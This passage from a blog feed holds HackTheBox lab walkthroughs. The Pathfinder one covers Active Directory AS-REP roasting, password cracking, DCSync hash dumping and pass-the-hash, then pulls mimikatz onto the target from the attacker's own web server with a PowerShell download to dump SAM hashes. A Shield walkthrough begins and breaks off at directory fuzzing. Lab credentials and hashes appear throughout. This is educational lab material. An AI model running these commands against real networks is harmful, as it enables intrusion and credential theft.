49695/tcp open  unknown          syn-ack ttl 127
49714/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 174.50 seconds
           Raw packets sent: 85085 (3.744MB) | Rcvd: 80313 (3.213MB)
          </code></pre><p>This is why I recommend to scan all the ports. Here you can see there are so many ports open and by looking at the open ports (<code>ldap,kpasswd5 &amp; kerberos</code>) we can definitely say that this machine is an Active Directory machine. We haven&apos;t touched that area before. Sharp your Active Directory enumeration skills, it will worth if you are willing to try Red Team activities.</p><blockquote>Active Directory is a directory service developed by Microsoft for Windows domain networks. It is included in most Windows Server operating systems as a set of processes and services. Initially, Active Directory was only in charge of centralized domain management. [Copied from &#xA0;<a href="https://en.wikipedia.org/wiki/Active_Directory" rel="noopener noreferrer">Wikipedia</a>]</blockquote><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result, we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Pathfinder]
&#x2514;&#x2500;# nmap -sV -sC -oN DetailPorts.nmap -p 49667,49720,49676,49677,593,139,3269,389,9389,135,3268,49664,464,47001,636,49700,49665,49666,49672,5985,445,53,49683,88 10.10.10.30
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-21 11:43 EDT
Nmap scan report for 10.10.10.30
Host is up (0.23s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-21 22:54:30Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49672/tcp closed unknown
49676/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc         Microsoft Windows RPC
49683/tcp open   msrpc         Microsoft Windows RPC
49700/tcp closed unknown
49720/tcp closed unknown
Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h11m13s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-05-21T22:55:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.98 seconds</code></pre><p>As it is an Active Directory machine, our enumeration steps will be different. ldap enumeration is pretty cool if you use <a href="https://github.com/BloodHoundAD/BloodHound" rel="noopener noreferrer">BloodHound</a> &#xA0;because it gives us graphical information. But it&apos;s already done in official writeup. So let&apos;s begin with my way. &#x1F60E;&#x1F60E;</p><h3 id="013-discover-more-on-domain">01.3 Discover more on domain</h3><p>Nmap tells us the domain (<code>Domain: MEGACORP</code>) we are in. And don&apos;t forget we had some credentials from <a href="http://192.168.8.3:2368/@shapmanasick/s/starting-point-htb/~/drafts/-MaejVpcJMrLfIK9Ejp8/oopsie-walkthrough#04-post-exploitation">Shield </a>machine. <code>sandra:Password1234! </code>First we can tryout with <a href="https://github.com/dirkjanm/ldapdomaindump" rel="noopener noreferrer"><code>ldapdomaindump </code></a>tool. Let&apos;s start.</p><pre><code class="language-bash">ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30 --no-json --no-grep  </code></pre><pre><code class="language-bash">-u    : DOMAIN\username for authentication, leave empty for anonymous authentication
-p    : Password or LM:NTLM hash, will prompt if not specified
-o    : Directory in which the dump will be saved (default: current)
--no-json    : Disable JSON output
--no-grep    : Disable Greppable output </code></pre><p>Here is the output, &#x1F447;&#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Pathfinder]
&#x2514;&#x2500;# ldapdomaindump -u MEGACORP\\sandra -p Password1234! -o ldapinfo 10.10.10.30
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Pathfinder]
&#x2514;&#x2500;# cd ldapinfo

&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Pathfinder/ldapinfo]
&#x2514;&#x2500;# ls
domain_users.html  domain_computers_by_os.html  domain_computers.html  domain_groups.html  domain_policy.html  domain_trusts.html  domain_users_by_group.html  </code></pre><p>As you can see there are a lot of HTML files here. Among them, first I choose <code>domain_users.html</code> You can view through it from the browser. But instead of that, I will use <a href="https://pypi.org/project/html2text/" rel="noopener noreferrer"><code>html2text</code> </a>tool. You can simply install it by typing <code>sudo apt-get install html2text</code> . However the result will be like this. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-58.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1166" height="514" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-58.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-58.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-58.png 1166w" sizes="(min-width: 720px) 720px"></figure><p>There are 5 accounts here. <code>Guest, Administrator</code> and <code>krbtgt </code>accounts are the default accounts. <code>sandra </code>and <code>svc_bes </code>accounts are user created ones. As you can see, I highlighted the <code>svc_bes </code>account because it has enabled the<strong><code>DONT_REQ_PREAUTH</code></strong> flag.</p><p>Now I&apos;ll simply explain what the kerberos authentication is. If you need to know what <code>DONT_REQ_PREAUTH</code> flag means, you must understand the<strong> kerberos authentication </strong>before.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaF3QozWJmcpKh919-T%2F-MaF5pftRxID2hv08kO6%2Fimage.png?alt=media&amp;token=c0162370-9528-4d00-9132-23921274ab6c" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>This draft shows you how the normal authentication process. But if <code>DONT_REQ_PREAUTH</code> flag is set, <strong>second </strong>and <strong>third </strong>steps of the process can be missed. That means you can directly request the service ticket. Click <a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)" rel="noopener noreferrer">here</a> if you need more information about kerberos authentication.</p><hr><h2 id="02-foothold">02. Foothold</h2><p>Now we are going to use <a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">impacket&apos;s</a> <code>GetNPUsers.py</code> script to grab the request service ticket.</p><p>Type below commands to grab the request ticket.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGACORP.LOCAL/svc_bes -dc-ip 10.10.10.30 -request -no-pass -format john</code></pre><pre><code>-request   : Requests TGT for users and output them in JtR/hashcat format (default False)
-no-pass   : Don&apos;t ask for password (useful for Kerberos authentication)
-dc-ip     : IP Address of the domain controller.
-format    : Format to save the AS_REQ of users without pre-authentication. Default is hashcat</code></pre><p>Output will be like this. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-59.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1348" height="171" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-59.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-59.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-59.png 1348w" sizes="(min-width: 720px) 720px"></figure><p>We grabbed the ticket. Now it&apos;s time to powerup <a href="https://www.openwall.com/john/" rel="noopener noreferrer">John the Ripper</a> and crack the hash. First of all copy that hash to file then run the john.&#x1F920;&#x1F920;</p><pre><code class="language-bash">john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-60.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1344" height="320" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-60.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-60.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-60.png 1344w" sizes="(min-width: 720px) 720px"></figure><p>We got the password for <code>svc_bes</code> !!!</p><ul><li>svc_bes : Sheffield19</li></ul><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-61.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="508" height="288"></figure><p>Now since we have the username and password, we can use <a href="https://github.com/Hackplayers/evil-winrm" rel="noopener noreferrer">Evil-WinRM</a> tool. You can simply install it by typing <code>gem install evil-winrm</code> and hit enter, then the tool will be installed to your machine. &#x1F60E;&#x1F60E;</p><p>Now, don&apos;t you have a question &#x2753; We already have the username and password for user <strong>sandra</strong>. Why didn&apos;t we use it? It&apos;s because there is nothing inside that account. It&apos;s just a simple user account.</p><p>Let&apos;s run the tool for <code>svc_bes</code> account.</p><pre><code class="language-bash">evil-winrm -u svc_bes -p Sheffield19 -i 10.10.10.30
</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-62.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="569" height="205"></figure><p>So we got the user flag. Now, time to escalate privileges.</p><hr><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>Now we are going to perform <a href="https://www.qomplx.com/kerberos_dcsync_attacks_explained/" rel="noopener noreferrer">DCSync attack</a> and dump the NTLM hashes of all domain users using the Impacket&apos;s <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py" rel="noopener noreferrer">secretsdump.py </a>script. &#x1F608;&#x1F608; Let&apos;s try it</p><pre><code class="language-bash"> /usr/share/doc/python3-impacket/examples/secretsdump.py MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFHcLpM7vaCNtrd5wF%2F-MaFNNHT8ij_UjXd4Vsa%2Fimage.png?alt=media&amp;token=812cb165-e2ee-4b77-8ad7-9f606011a238" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br>As you can see, We have NTLM hash for the Administrator account. We can use this to perform <strong><strong>Pass The Hash attack</strong></strong> and gain elevated access to the system. Also we can use Impacket&apos;s<a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py" rel="noopener noreferrer"> psexec.py</a> for this too.</p><p>See how &#xA0;<a href="https://github.com/SecureAuthCorp/impacket" rel="noopener noreferrer">impacket</a> &#xA0;helps us during this machine. Give respect to the <a href="https://www.secureauth.com/" rel="noopener noreferrer">SecureAuth Corporation</a>. &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><h3 id="031-perform-pass-the-hash-attack">03.1 Perform Pass The Hash Attack</h3><p>First, copy the above Administrator&apos;s hash without triple colon (:::) at the end and then type this.</p><pre><code class="language-bash">/usr/share/doc/python3-impacket/examples/psexec.py MEGACORP.LOCAL/Administrator@10.10.10.30 -hashes &lt;NTML hash&gt;</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-63.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1880" height="564" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-63.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-63.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-63.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-63.png 1880w" sizes="(min-width: 720px) 720px"></figure><p><br>We got the root flag too!!. &#x1F9D0;&#x1F9D0;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-64.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="845" height="762" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-64.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-64.png 845w" sizes="(min-width: 720px) 720px"></figure><hr><h3 id="04-post-exploitation">04. Post Exploitation</h3><p>Since these boxes are all connected, we are going to grab the local admin hash too. So let&#x2019;s upload <a href="https://github.com/gentilkiwi/mimikatz/wiki" rel="noopener noreferrer">mimikatz.</a> You can download &#xA0;<code>mimikatz</code> tool from <a href="https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip" rel="noopener noreferrer">here</a> and upload it to the box using python demon web server.</p><pre><code class="language-bash">wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210512/mimikatz_trunk.zip &amp;&amp; unzip mimikatz_trunk.zip &amp;&amp; cd x64 &amp;&amp; python3 -m http.server</code></pre><pre><code class="language-bash">powershell.exe -c &quot;IWR -useBasicParsing http://&lt;YourIP&gt;:8000/mimikatz.exe -o mcat.exe&quot;</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-65.png" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy" width="1249" height="917" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-65.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-65.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-65.png 1249w" sizes="(min-width: 720px) 720px"></figure><p>Then we can run that file by typing <code>.\mcat</code> And then run the <code>lsadump::sam</code> command.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFPGC9ij8JayLKr9eX%2F-MaFVUjWTVrs7MfwbN4e%2Fimage.png?alt=media&amp;token=4b7381e5-b523-4a4a-88d5-dc45afc5c074" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Here is the hash : 7facdc498ed1680c4fd1448319a8c04f</p><p>You can decode it through the <a href="https://crackstation.net/" rel="noopener noreferrer">crackstation </a>site.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFVfK7TEHx4qpr0UnI%2F-MaFX51eTjy22bDTPq1y%2Fimage.png?alt=media&amp;token=9968dc48-bcc7-4baf-b418-114c36f1ef37" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>The password is : <code>Password!</code></p><p>Finally we are done. and from here you must have VIP or VIP+ &#xA0;membership to play with other boxes.</p><p>Okay... I&#x2019;ll see you on the next box! &#x1F64B;&#x200D;&#x2642;&#xFE0F;&#x1F64B;&#x200D;&#x2642;&#xFE0F;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MaFYGcfEGWqroDWh_E5%2F-MaFYJtpWXyxsXv3xc10%2Fimage.png?alt=media&amp;token=0763dbb9-6089-45de-b213-2139fcad6de3" class="kg-image" alt="Pathfinder Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br><strong><strong>Find me on </strong></strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Shield Walkthrough]]></title><description><![CDATA[<p>After the Vaccine Walkthrough, here I&apos;m with Shield box. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through</p>]]></description><link>http://192.168.8.3:2368/starting-point-htb-shield-walkthrough/</link><guid isPermaLink="false">60aec6f154f7b1d506ddbb1b</guid><category><![CDATA[h4rithd]]></category><category><![CDATA[HackTheBox]]></category><category><![CDATA[HarithDilshan]]></category><category><![CDATA[HTB Walkthrough]]></category><category><![CDATA[HTB Writeup]]></category><category><![CDATA[StartingPoint]]></category><category><![CDATA[Writeup]]></category><category><![CDATA[Shield Walkthrough]]></category><category><![CDATA[Shield]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Fri, 30 Apr 2021 22:08:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/4.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/4.jpg" alt="Shield Walkthrough"><p>After the Vaccine Walkthrough, here I&apos;m with Shield box. Let&apos;s hack and grab the flags.</p><hr><p>As I mentioned before, the starting point machines are a series of 9 easily rated machines that should be <strong>rooted in sequence</strong>. So it means, if you need to go through this box, first of all you must have a complete <a href="http://192.168.8.3:2368/@shapmanasick/s/starting-point-htb/vaccine-walkthrough">Vaccine </a>machine.</p><p>Enough talks, &#x1F971; Let&#x2019;s Get It Started &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedure to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h2><p>To start machine, just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-39.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1637" height="730" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-39.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-39.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-39.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-39.png 1637w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. Usually it is <code><strong>10.10.10.29 </strong></code><strong>&#x1F920;</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-Ma8rCTSABTSH_XeG1Vi%2F-Ma8ssSW-inIrWZ0ACd2%2Fimage.png?alt=media&amp;token=b3e10e07-6b98-4526-a81c-461351c2569b" class="kg-image" alt="Shield Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most cases ping will be a success! &#x1F642;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# ping 10.10.10.29 -c 2
PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
64 bytes from 10.10.10.29: icmp_seq=1 ttl=127 time=235 ms
64 bytes from 10.10.10.29: icmp_seq=2 ttl=127 time=242 ms

--- 10.10.10.29 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1003ms
rtt min/avg/max/mdev = 234.989/238.250/241.512/3.261 ms</code></pre><blockquote>As a ping result, It&apos;s TTL=127. There is only one route between machine and us (VPN). So definitely it will be a Windows machine.</blockquote><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.29
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 09:11 EDT
Initiating Ping Scan at 09:11
Scanning 10.10.10.29 [4 ports]
Completed Ping Scan at 09:11, 0.30s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:11
Scanning 10.10.10.29 [65535 ports]
Discovered open port 3306/tcp on 10.10.10.29
Discovered open port 80/tcp on 10.10.10.29
SYN Stealth Scan Timing: About 6.12% done; ETC: 09:19 (0:07:56 remaining)
SYN Stealth Scan Timing: About 14.99% done; ETC: 09:18 (0:05:46 remaining)
SYN Stealth Scan Timing: About 24.54% done; ETC: 09:17 (0:04:40 remaining)
SYN Stealth Scan Timing: About 32.52% done; ETC: 09:17 (0:04:11 remaining)
SYN Stealth Scan Timing: About 39.61% done; ETC: 09:17 (0:03:50 remaining)
SYN Stealth Scan Timing: About 53.18% done; ETC: 09:17 (0:02:39 remaining)
SYN Stealth Scan Timing: About 70.11% done; ETC: 09:16 (0:01:30 remaining)
Completed SYN Stealth Scan at 09:15, 253.94s elapsed (65535 total ports)
Nmap scan report for 10.10.10.29
Host is up, received echo-reply ttl 127 (0.22s latency).
Scanned at 2021-05-20 09:11:32 EDT for 254s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack ttl 127
3306/tcp open  mysql   syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 254.38 seconds
           Raw packets sent: 131239 (5.774MB) | Rcvd: 170 (7.464KB)</code></pre><p>Really? There are only two ports open. &#x1F611;&#x1F611;&#x1F636;</p><h3 id="%E2%80%8C012-run-nmap-scripting-engine">&#x200C;01.2 Run Nmap Scripting Engine</h3><p>To get the best result, We can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all of the open ports and therefore we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# nmap -sV -sC -oN DetailPorts.nmap -p 80,3306 10.10.10.29
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 09:27 EDT
Nmap scan report for 10.10.10.29
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3306/tcp open  mysql   MySQL (unauthorized)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.56 seconds</code></pre><p>There are 2 main ports. One is running webserver and other one is running MySQL server. &#x1F937;&#x200D;&#x2642;&#xFE0F;&#x1F937;&#x200D;&#x2642;&#xFE0F;</p><h3 id="013-discover-more-on-port-80">01.3 Discover more on port 80</h3><p>&#x1F575;&#xFE0F;&#x200D;&#x2640;&#xFE0F; Now we have only two open ports, so I chose port 80 first. Now you have a pretty big idea about what we need to do with port 80 right? Let&apos;s open our web browser, type 10.10.10.29 and then hit enter.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-40.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="1354" height="747" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-40.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-40.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-40.png 1354w" sizes="(min-width: 720px) 720px"></figure><p><br>What the hell! Feel like there are more steps, &#x1F616; Now we need to find whether there are any other directories here?</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-41.png" class="kg-image" alt="Shield Walkthrough" loading="lazy" width="236" height="177"></figure><p><br>Again it&apos;s time to start fuzzing. I have already told you how to use <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough#02-foothold"><code>dirsearch</code></a>tool in <a href="https://app.gitbook.com/@shapmanasick/s/starting-point-htb/oopsie-walkthrough">oopsie </a>walkthrough. Now it&apos;s time to learn a new cool tool right. &#x1F60D;&#x1F60E; The tool is <a href="https://github.com/ffuf/ffuf" rel="noopener noreferrer"><code>ffuf</code></a>. A fast web fuzzer written in Go.</p><blockquote>You can download and install this tool by reading <a href="https://github.com/ffuf/ffuf#installation" rel="noopener noreferrer">this</a>. It must be installed on your OS if you are willing to face OSCP. Because it helps a lot more than ordinary <a href="https://tools.kali.org/web-applications/wfuzz" rel="noopener noreferrer"><code>Wfuzz</code></a>tool.</blockquote><p>Let&apos;s enumerate the web directories!!</p><pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ</code></pre><p>Here is the output. &#x1F447;&#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Shield]
&#x2514;&#x2500;# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.29/FUZZ        

        /&apos;___\  /&apos;___\           /&apos;___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.29/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 703, Words: 27, Lines: 32]
wordpress               [Status: 301, Size: 152, Words: 9, Lines: 2]
